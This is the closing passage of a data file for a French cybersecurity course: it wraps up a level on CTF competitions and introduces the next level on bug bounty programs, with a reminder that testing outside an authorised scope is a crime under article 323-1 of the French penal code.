              "En sortant de ce niveau, tu es capable de résoudre un challenge web (injection, cookies, LFI), de décoder les encodages classiques, de casser des hashs, d'analyser une image et une capture réseau, de lire un binaire, de comprendre un buffer overflow, de faire de l'escalade de privilèges sur une machine d'entraînement, et de documenter chaque étape dans un write-up. C'est un profil complet de joueur de CTF."
            ),
            h("La porte d'après : le Bug Bounty"),
            p(
              "Le niveau 8 du cursus transforme ces compétences en chasse aux failles réelles : les programmes de Bug Bounty. Des plateformes publient des périmètres autorisés, des entreprises paient les chercheurs qui y trouvent des failles. Tu y appliqueras exactement les techniques de ce module — mais sur des cibles réelles, avec un cadre contractuel, un rapport à rédiger et une rémunération à la clé."
            ),
            h("Ce qui change entre le CTF et le Bug Bounty"),
            list(
              "La cible : un challenge pédagogique devient un système réel sous autorisation.",
              "Le cadre : une plateforme de jeu devient un périmètre contractuel précis.",
              "La finalité : le flag devient un rapport de vulnérabilité.",
              "L'enjeu : le score devient la rémunération et la réputation.",
              "Le code de conduite : les règles du jeu deviennent la loi et le contrat."
            ),
            h("Les réflexes à garder"),
            p(
              "Les trois réflexes qui ont fait de toi un bon joueur feront de toi un bon chasseur : la méthode (reconnaître, extraire, décoder, documenter), la persévérance (la règle des 30 minutes vaut aussi pour les bug bounty) et l'éthique (ne toucher que ce qui est autorisé, signaler ce qu'on trouve)."
            ),
            callout(
              "Tes compétences sont maintenant réelles : la responsabilité aussi. Chaque technique de ce niveau appliquée hors cadre autorisé est un délit (article 323-1 du code pénal). Le Bug Bounty t'offre le cadre légal pour les exercer : saisis-le, et continue d'apprendre."
            ),
            h("La suite du cursus"),
            p(
              "Le niveau 8 te fera entrer dans le monde du Bug Bounty : comprendre les programmes, choisir ses cibles, chasser les failles web, rédiger des rapports qui valent de l'or, et éviter les pièges juridiques. Le terrain de jeu change, ta méthode reste. Félicitations pour le niveau 7 — à toi le niveau 8."
            ),
            h("En résumé"),
            list(
              "Niveau 7 validé : CTF, catégories, outils, méthode, éthique.",
              "Le niveau 8 ouvre la porte du Bug Bounty : failles réelles, cadre contractuel.",
              "CTF et Bug Bounty partagent la même méthode : reconnaître, extraire, décoder, documenter.",
              "L'éthique reste la règle d'or : uniquement dans le cadre autorisé.",
              "À toi de jouer pour le niveau 8 : Bug Bounty."
            )
          ]
        },
      ],
    },
  ],
};
